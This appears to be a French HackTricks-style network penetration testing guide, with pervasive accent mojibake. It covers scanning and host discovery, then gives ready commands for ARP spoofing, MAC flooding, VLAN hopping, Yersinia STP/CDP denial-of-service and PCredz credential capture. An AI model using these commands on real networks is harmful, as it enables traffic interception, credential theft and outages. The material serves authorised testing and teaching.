# Test d'intrusion r√©seau

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce de prime de bug** : **inscrivez-vous** √† **Intigriti**, une plateforme de prime de bug premium cr√©√©e par des pirates informatiques, pour des pirates informatiques ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## D√©couverte des h√¥tes depuis l'ext√©rieur

Il s'agit d'une **section br√®ve** sur la fa√ßon de trouver des **IP r√©pondant** depuis l'**Internet**.\
Dans cette situation, vous avez une certaine **plage d'IP** (peut-√™tre m√™me plusieurs **plages**) et vous devez simplement trouver **quelles IPs r√©pondent**.

### ICMP

C'est la fa√ßon la **plus facile** et la **plus rapide** de d√©couvrir si un h√¥te est en ligne ou non.\
Vous pourriez essayer d'envoyer quelques paquets **ICMP** et **attendre des r√©ponses**. La mani√®re la plus simple est d'envoyer une **demande d'√©cho** et d'attendre la r√©ponse. Vous pouvez le faire en utilisant simplement une commande `ping` ou en utilisant `fping` pour les **plages**.\
Vous pourriez √©galement utiliser **nmap** pour envoyer d'autres types de paquets ICMP (ceci √©vitera les filtres aux demandes-r√©ponses d'√©cho ICMP courantes).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### D√©couverte des ports TCP

Il est tr√®s courant de constater que tous les types de paquets ICMP sont filtr√©s. Ensuite, tout ce que vous pouvez faire pour v√©rifier si un h√¥te est actif est **d'essayer de trouver des ports ouverts**. Chaque h√¥te a **65535 ports**, donc, si vous avez un "grand" p√©rim√®tre, vous **ne pouvez pas** tester si **chaque port** de chaque h√¥te est ouvert ou non, cela prendrait trop de temps.\
Donc, ce dont vous avez besoin est un **scanner de ports rapide** ([masscan](https://github.com/robertdavidgraham/masscan)) et une liste des **ports les plus utilis√©s :**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### D√©couverte de port HTTP

C'est simplement une d√©couverte de port TCP utile lorsque vous voulez **vous concentrer sur la d√©couverte de services HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### D√©couverte de port UDP

Vous pourriez √©galement essayer de v√©rifier si certains **ports UDP sont ouverts** pour d√©cider si vous devriez **accorder plus d'attention** √† un **h√¥te.** Comme les services UDP **ne r√©pondent g√©n√©ralement pas** avec **de donn√©es** √† un paquet de sondage UDP vide r√©gulier, il est difficile de dire si un port est filtr√© ou ouvert. La mani√®re la plus simple de d√©cider est d'envoyer un paquet li√© au service en cours d'ex√©cution, et comme vous ne savez pas quel service est en cours d'ex√©cution, vous devriez essayer le plus probable en fonction du num√©ro de port :
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La ligne nmap propos√©e pr√©c√©demment testera les **1000 ports UDP principaux** de chaque h√¥te dans la plage **/24**, mais m√™me cela prendra **>20min**. Si vous avez besoin de **r√©sultats plus rapides**, vous pouvez utiliser [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Cela enverra ces **sondes UDP** vers leur **port attendu** (pour une plage /24, cela prendra seulement 1 min) : _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### D√©couverte de ports SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Test d'intrusion Wifi

Ici, vous pouvez trouver un guide complet de toutes les attaques Wifi bien connues au moment de la r√©daction :

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## D√©couverte des h√¥tes de l'int√©rieur

Si vous √™tes √† l'int√©rieur du r√©seau, l'une des premi√®res choses que vous voudrez faire est de **d√©couvrir d'autres h√¥tes**. Selon **le niveau de discr√©tion** que vous pouvez/voulez maintenir, diff√©rentes actions peuvent √™tre effectu√©es :

### Passive

Vous pouvez utiliser ces outils pour d√©couvrir passivement les h√¥tes √† l'int√©rieur d'un r√©seau connect√© :
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Actif

Notez que les techniques comment√©es dans [_**D√©couverte des h√¥tes depuis l'ext√©rieur**_](./#d√©couverte-des-h√¥tes-depuis-l'ext√©rieur) (_D√©couverte des ports TCP/HTTP/UDP/SCTP_) peuvent √©galement √™tre **appliqu√©es ici**.\
Cependant, √©tant donn√© que vous √™tes dans le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plus de choses**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP Actif

Notez que les techniques comment√©es dans _D√©couverte des h√¥tes depuis l'ext√©rieur_ ([_**ICMP**_](./#icmp)) peuvent √©galement √™tre **appliqu√©es ici**.\
Cependant, √©tant donn√© que vous √™tes dans le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plusieurs choses** :

- Si vous **pinguez** une **adresse de diffusion de sous-r√©seau**, le ping devrait arriver √† **chaque h√¥te** et ils pourraient vous **r√©pondre** : `ping -b 10.10.5.255`
- En pingant l'**adresse de diffusion du r√©seau**, vous pourriez m√™me trouver des h√¥tes √† l'int√©rieur d'**autres sous-r√©seaux** : `ping -b 255.255.255.255`
- Utilisez les indicateurs `-PE`, `-PP`, `-PM` de `nmap` pour effectuer une d√©couverte d'h√¥tes en envoyant respectivement des demandes de **requ√™te ICMPv4 echo**, de **timestamp** et de **masque de sous-r√©seau** : `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **R√©veil sur R√©seau (Wake On Lan)**

Le R√©veil sur R√©seau est utilis√© pour **allumer** les ordinateurs via un **message r√©seau**. Le paquet magique utilis√© pour allumer l'ordinateur est simplement un paquet o√π un **MAC Dst** est fourni et est ensuite **r√©p√©t√© 16 fois** dans le m√™me paquet.\
Ces types de paquets sont g√©n√©ralement envoy√©s dans un **ethernet 0x0842** ou dans un **paquet UDP au port 9**.\
Si aucun **\[MAC]** n'est fourni, le paquet est envoy√© √† l'**ethernet de diffusion** (et le MAC de diffusion sera celui qui est r√©p√©t√©).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Balayage des h√¥tes

Une fois que vous avez d√©couvert toutes les adresses IP (externes ou internes) que vous souhaitez analyser en profondeur, diff√©rentes actions peuvent √™tre effectu√©es.

### TCP

* Port **ouvert** : _SYN --> SYN/ACK --> RST_
* Port **ferm√©** : _SYN --> RST/ACK_
* Port **filtr√©** : _SYN --> \[PAS DE R√âPONSE]_
* Port **filtr√©** : _SYN --> message ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Il existe 2 options pour scanner un port UDP :

* Envoyer un **paquet UDP** et v√©rifier la r√©ponse _**ICMP unreachable**_ si le port est **ferm√©** (dans plusieurs cas, ICMP sera **filtr√©** donc vous ne recevrez aucune information si le port est ferm√© ou ouvert).
* Envoyer des **datagrammes format√©s** pour obtenir une r√©ponse d'un **service** (par exemple, DNS, DHCP, TFTP, et d'autres, comme list√© dans _nmap-payloads_). Si vous recevez une **r√©ponse**, alors le port est **ouvert**.

**Nmap** va **m√©langer les deux** options en utilisant "-sV" (les scans UDP sont tr√®s lents), mais notez que les scans UDP sont plus lents que les scans TCP :
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Analyse SCTP

**SCTP (Stream Control Transmission Protocol)** est con√ßu pour √™tre utilis√© aux c√¥t√©s de **TCP (Transmission Control Protocol)** et **UDP (User Datagram Protocol)**. Son objectif principal est de faciliter le transport des donn√©es t√©l√©phoniques sur les r√©seaux IP, en refl√©tant bon nombre des fonctionnalit√©s de fiabilit√© trouv√©es dans **Signaling System 7 (SS7)**. **SCTP** est un composant essentiel de la famille de protocoles **SIGTRAN**, qui vise √† transporter des signaux SS7 sur les r√©seaux IP.

Le support de **SCTP** est assur√© par divers syst√®mes d'exploitation, tels que **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, et **VxWorks**, ce qui indique son acceptation et son utilit√© √©tendues dans le domaine des t√©l√©communications et des r√©seaux.

Deux analyses diff√©rentes pour SCTP sont propos√©es par nmap : _-sY_ et _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### √âvasion des IDS et IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Plus d'options nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### R√©v√©lation des adresses IP internes

**Les routeurs, pare-feu et p√©riph√©riques r√©seau mal configur√©s** r√©pondent parfois aux sondes r√©seau en utilisant des **adresses source non publiques**. **tcpdump** peut √™tre utilis√© pour identifier les paquets re√ßus √† partir d'adresses priv√©es lors des tests. Plus pr√©cis√©ment, sur Kali Linux, les paquets peuvent √™tre captur√©s sur l'interface **eth2**, qui est accessible depuis Internet. Il est important de noter que si votre configuration est derri√®re un NAT ou un pare-feu, de tels paquets sont susceptibles d'√™tre filtr√©s.
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

En sniffant, vous pouvez apprendre des d√©tails sur les plages d'adresses IP, les tailles de sous-r√©seau, les adresses MAC et les noms d'h√¥tes en examinant les trames et paquets captur√©s. Si le r√©seau est mal configur√© ou si le tissu de commutation est sous stress, les attaquants peuvent capturer du mat√©riel sensible via un sniffing r√©seau passif.

Si un r√©seau Ethernet commut√© est correctement configur√©, vous ne verrez que des trames de diffusion et du mat√©riel destin√© √† votre adresse MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
On peut √©galement capturer des paquets depuis une machine distante via une session SSH avec Wireshark en tant qu'interface graphique en temps r√©el.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercap est un outil de pentesting r√©seau en ligne de commande qui permet d'effectuer diverses attaques sur les r√©seaux locaux. Il peut √™tre utilis√© pour l'interception de paquets, le sniffing, le spoofing d'ARP, le phishing, l'injection de contenu malveillant, et bien d'autres attaques. Bettercap est un outil polyvalent largement utilis√© par les pentesteurs pour √©valuer la s√©curit√© des r√©seaux.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

√âvidemment.

### Capture de cr√©dentiels

Vous pouvez utiliser des outils comme [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) pour analyser les cr√©dentiels √† partir d'un fichier pcap ou d'une interface en direct.

## Attaques LAN

### Spoofing ARP

Le Spoofing ARP consiste √† envoyer des r√©ponses ARP gratuites pour indiquer que l'IP d'une machine a l'adresse MAC de notre appareil. Ensuite, la victime modifiera la table ARP et contactera notre machine chaque fois qu'elle voudra contacter l'IP falsifi√©e.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - D√©bordement CAM

D√©bordez la table CAM du commutateur en envoyant de nombreux paquets avec des adresses MAC source diff√©rentes. Lorsque la table CAM est pleine, le commutateur commence √† se comporter comme un concentrateur (diffusant tout le trafic).
```bash
macof -i <interface>
```
Dans les commutateurs modernes, cette vuln√©rabilit√© a √©t√© corrig√©e.

### Attaques 802.1Q VLAN / DTP

#### Trunking Dynamique

Le **Protocole de Trunking Dynamique (DTP)** est con√ßu comme un protocole de couche de liaison pour faciliter un syst√®me automatique de trunking, permettant aux commutateurs de s√©lectionner automatiquement les ports en mode trunk (Trunk) ou non-trunk. Le d√©ploiement de **DTP** est souvent consid√©r√© comme indicatif d'une conception r√©seau sous-optimale, soulignant l'importance de configurer manuellement les tron√ßons uniquement lorsque cela est n√©cessaire et de garantir une documentation ad√©quate.

Par d√©faut, les ports de commutateur sont configur√©s pour fonctionner en mode Dynamique Automatique, ce qui signifie qu'ils sont pr√™ts √† initier le trunking si un commutateur voisin le demande. Un probl√®me de s√©curit√© survient lorsqu'un testeur d'intrusion ou un attaquant se connecte au commutateur et envoie une trame DTP Souhaitable, obligeant le port √† passer en mode trunk. Cette action permet √† l'attaquant d'√©num√©rer les VLAN via l'analyse des trames STP et de contourner la segmentation des VLAN en configurant des interfaces virtuelles.

La pr√©sence de DTP dans de nombreux commutateurs par d√©faut peut √™tre exploit√©e par des adversaires pour imiter le comportement d'un commutateur, leur permettant ainsi d'acc√©der au trafic √† travers tous les VLAN. Le script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) est utilis√© pour surveiller une interface, r√©v√©lant si un commutateur est en mode par d√©faut, trunk, dynamique, automatique ou acc√®s, ce dernier √©tant la seule configuration immunis√©e contre les attaques de saut de VLAN. Cet outil √©value l'√©tat de vuln√©rabilit√© du commutateur.

Si une vuln√©rabilit√© r√©seau est identifi√©e, l'outil _**Yersinia**_ peut √™tre utilis√© pour "activer le trunking" via le protocole DTP, permettant l'observation des paquets de tous les VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (266).png>)

Pour √©num√©rer les VLAN, il est √©galement possible de g√©n√©rer le trame DTP Desirable avec le script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**e pas interrompre le script sous aucun pr√©texte. Il injecte DTP Desirable toutes les trois secondes. **Les canaux de tronc dynamiquement cr√©√©s sur le commutateur ne restent en vie que pendant cinq minutes. Apr√®s cinq minutes, le tronc tombe.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Je tiens √† souligner que **Access/Desirable (0x03)** indique que le trame DTP est de type Souhaitable, ce qui indique au port de passer en mode Tronc. Et **802.1Q/802.1Q (0xa5)** indique le type d'encapsulation **802.1Q**.

En analysant les trames STP, **nous apprenons l'existence de VLAN 30 et VLAN 60.**

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

#### Attaquer des VLAN sp√©cifiques

Une fois que vous connaissez les identifiants VLAN et les valeurs IP, vous pouvez **configurer une interface virtuelle pour attaquer un VLAN sp√©cifique**.\
Si le DHCP n'est pas disponible, utilisez _ifconfig_ pour d√©finir une adresse IP statique.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saut de VLAN Automatique

L'attaque discut√©e de **Dynamic Trunking et la cr√©ation d'interfaces virtuelles pour d√©couvrir des h√¥tes √† l'int√©rieur** d'autres VLAN sont **automatiquement effectu√©es** par l'outil : [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double √âtiquetage

Si un attaquant conna√Æt la valeur du **MAC, de l'IP et de l'ID VLAN de l'h√¥te victime**, il pourrait essayer de **double √©tiqueter un trame** avec son VLAN d√©sign√© et le VLAN de la victime et envoyer un paquet. Comme la **victime ne pourra pas se connecter en retour** avec l'attaquant, la **meilleure option pour l'attaquant est de communiquer via UDP** vers des protocoles qui peuvent effectuer des actions int√©ressantes (comme SNMP).

Une autre option pour l'attaquant est de lancer un **balayage de port TCP en usurpant une IP contr√¥l√©e par l'attaquant et accessible par la victime** (probablement via internet). Ensuite, l'attaquant pourrait renifler dans le deuxi√®me h√¥te lui appartenant s'il re√ßoit des paquets de la victime.

![](<../../.gitbook/assets/image (187).png>)

Pour effectuer cette attaque, vous pourriez utiliser scapy : `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Contournement de la segmentation VLAN lat√©rale <a href="#d679" id="d679"></a>

Si vous avez **acc√®s √† un commutateur auquel vous √™tes directement connect√©**, vous avez la possibilit√© de **contourner la segmentation VLAN** au sein du r√©seau. Il vous suffit de **passer le port en mode trunk** (√©galement appel√© trunk), de cr√©er des interfaces virtuelles avec les identifiants des VLAN cibles, et de configurer une adresse IP. Vous pouvez essayer de demander l'adresse de mani√®re dynamique (DHCP) ou la configurer de mani√®re statique. Cela d√©pend du cas.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Contournement de VLAN priv√© de couche 3

Dans certains environnements, tels que les r√©seaux sans fil invit√©s, les param√®tres d'**isolation de port (√©galement connus sous le nom de VLAN priv√©)** sont mis en place pour emp√™cher les clients connect√©s √† un point d'acc√®s sans fil de communiquer directement entre eux. Cependant, une technique a √©t√© identifi√©e pour contourner ces mesures d'isolation. Cette technique exploite soit l'absence de listes de contr√¥le d'acc√®s r√©seau, soit leur configuration incorrecte, permettant aux paquets IP d'√™tre rout√©s √† travers un routeur pour atteindre un autre client sur le m√™me r√©seau.

L'attaque est ex√©cut√©e en cr√©ant un **paquet qui contient l'adresse IP du client de destination mais avec l'adresse MAC du routeur**. Cela am√®ne le routeur √† transmettre par erreur le paquet au client cible. Cette approche est similaire √† celle utilis√©e dans les attaques √† double √©tiquetage, o√π la capacit√© de contr√¥ler un h√¥te accessible √† la victime est utilis√©e pour exploiter la faille de s√©curit√©.

**√âtapes cl√©s de l'attaque :**

1. **Cr√©ation d'un paquet :** Un paquet est sp√©cialement cr√©√© pour inclure l'adresse IP du client cible mais avec l'adresse MAC du routeur.
2. **Exploitation du comportement du routeur :** Le paquet cr√©√© est envoy√© au routeur, qui, en raison de la configuration, redirige le paquet vers le client cible, contournant l'isolation fournie par les param√®tres de VLAN priv√©.

### Attaques VTP

Le VTP (VLAN Trunking Protocol) centralise la gestion des VLAN. Il utilise des num√©ros de r√©vision pour maintenir l'int√©grit√© de la base de donn√©es VLAN ; toute modification incr√©mente ce num√©ro. Les commutateurs adoptent les configurations avec des num√©ros de r√©vision plus √©lev√©s, mettant √† jour leurs propres bases de donn√©es VLAN.

#### R√¥les de domaine VTP

* **Serveur VTP :** G√®re les VLAN - cr√©e, supprime, modifie. Il diffuse des annonces VTP aux membres du domaine.
* **Client VTP :** Re√ßoit les annonces VTP pour synchroniser sa base de donn√©es VLAN. Ce r√¥le est limit√© aux modifications de configuration VLAN locales.
* **Transparent VTP :** Ne participe pas aux mises √† jour VTP mais transmet les annonces VTP. Non affect√© par les attaques VTP, il maintient un num√©ro de r√©vision constant de z√©ro.

#### Types d'annonces VTP

* **Annonce de synth√®se :** Diffus√©e par le serveur VTP toutes les 300 secondes, transportant des informations essentielles sur le domaine.
* **Annonce partielle :** Envoy√©e suite √† des modifications de configuration VLAN.
* **Demande d'annonce :** √âmise par un client VTP pour demander une annonce de synth√®se, g√©n√©ralement en r√©ponse √† la d√©tection d'un num√©ro de r√©vision de configuration plus √©lev√©.

Les vuln√©rabilit√©s VTP sont exploitables exclusivement via les ports trunk car les annonces VTP circulent uniquement √† travers eux. Les sc√©narios d'attaque post-DTP pourraient se tourner vers le VTP. Des outils comme Yersinia peuvent faciliter les attaques VTP, visant √† effacer la base de donn√©es VLAN, perturbant ainsi efficacement le r√©seau.

Remarque : Cette discussion concerne la version 1 de VTP (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
### Attaques STP

**Si vous ne pouvez pas capturer les trames BPDU sur vos interfaces, il est peu probable que vous r√©ussissiez dans une attaque STP.**

#### **STP BPDU DoS**

En envoyant beaucoup de BPDUs TCP (Notification de changement de topologie) ou Conf (les BPDUs envoy√©s lors de la cr√©ation de la topologie), les commutateurs sont surcharg√©s et cessent de fonctionner correctement.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Attaque TCP STP**

Lorsqu'un paquet TCP est envoy√©, la table CAM des commutateurs sera effac√©e en 15 secondes. Ensuite, si vous envoyez continuellement ce type de paquets, la table CAM sera red√©marr√©e en continu (ou toutes les 15 secondes) et lorsque cela se produit, le commutateur se comporte comme un concentrateur.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Attaque de la racine STP**

L'attaquant simule le comportement d'un commutateur pour devenir la racine STP du r√©seau. Ensuite, plus de donn√©es passeront par lui. C'est int√©ressant lorsque vous √™tes connect√© √† deux commutateurs diff√©rents.\
Cela se fait en envoyant des paquets CONF BPDU disant que la valeur de **priorit√©** est inf√©rieure √† la priorit√© r√©elle du commutateur racine actuel.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si l'attaquant est connect√© √† 2 commutateurs, il peut √™tre la racine de l'arbre et tout le trafic entre ces commutateurs passera par lui** (une attaque MITM sera effectu√©e).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attaques CDP

Le protocole de d√©couverte CISCO (CDP) est essentiel pour la communication entre les appareils CISCO, leur permettant de **s'identifier mutuellement et de partager des d√©tails de configuration**.

#### Collecte passive de donn√©es <a href="#id-0e0f" id="id-0e0f"></a>

CDP est configur√© pour diffuser des informations sur tous les ports, ce qui peut entra√Æner un risque de s√©curit√©. Un attaquant, en se connectant √† un port de commutateur, pourrait d√©ployer des sniffeurs r√©seau tels que **Wireshark**, **tcpdump**, ou **Yersinia**. Cette action peut r√©v√©ler des donn√©es sensibles sur l'appareil r√©seau, y compris son mod√®le et la version de Cisco IOS qu'il ex√©cute. L'attaquant pourrait ensuite cibler des vuln√©rabilit√©s sp√©cifiques dans la version identifi√©e de Cisco IOS.

#### Induction de l'inondation de la table CDP <a href="#id-0d6a" id="id-0d6a"></a>

Une approche plus agressive consiste √† lancer une attaque par d√©ni de service (DoS) en submergeant la m√©moire du commutateur, en se faisant passer pour des appareils CISCO l√©gitimes. Voici la s√©quence de commandes pour initier une telle attaque en utilisant Yersinia, un outil r√©seau con√ßu pour les tests :
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Pendant cette attaque, le CPU du commutateur et la table des voisins CDP sont fortement sollicit√©s, entra√Ænant ce qui est souvent appel√© une **"paralysie du r√©seau"** en raison de la consommation excessive de ressources.

#### Attaque d'Impersonation CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Vous pouvez √©galement utiliser [**scapy**](https://github.com/secdev/scapy/). Assurez-vous de l'installer avec le package `scapy/contrib`.

### Attaques VoIP et l'outil VoIP Hopper

Les t√©l√©phones VoIP, de plus en plus int√©gr√©s aux appareils IoT, offrent des fonctionnalit√©s telles que le d√©verrouillage des portes ou le contr√¥le des thermostats via des num√©ros de t√©l√©phone sp√©ciaux. Cependant, cette int√©gration peut pr√©senter des risques en mati√®re de s√©curit√©.

L'outil [**voiphopper**](http://voiphopper.sourceforge.net) est con√ßu pour √©muler un t√©l√©phone VoIP dans divers environnements (Cisco, Avaya, Nortel, Alcatel-Lucent). Il d√©couvre l'ID VLAN du r√©seau vocal en utilisant des protocoles tels que CDP, DHCP, LLDP-MED et 802.1Q ARP.

**VoIP Hopper** propose trois modes pour le protocole de d√©couverte Cisco (CDP) :

1. **Mode Sniff** (`-c 0`) : Analyse les paquets r√©seau pour identifier l'ID VLAN.
2. **Mode Spoof** (`-c 1`) : G√©n√®re des paquets personnalis√©s imitant ceux d'un v√©ritable appareil VoIP.
3. **Mode Spoof avec paquet pr√©fabriqu√©** (`-c 2`) : Envoie des paquets identiques √† ceux d'un mod√®le sp√©cifique de t√©l√©phone IP Cisco.

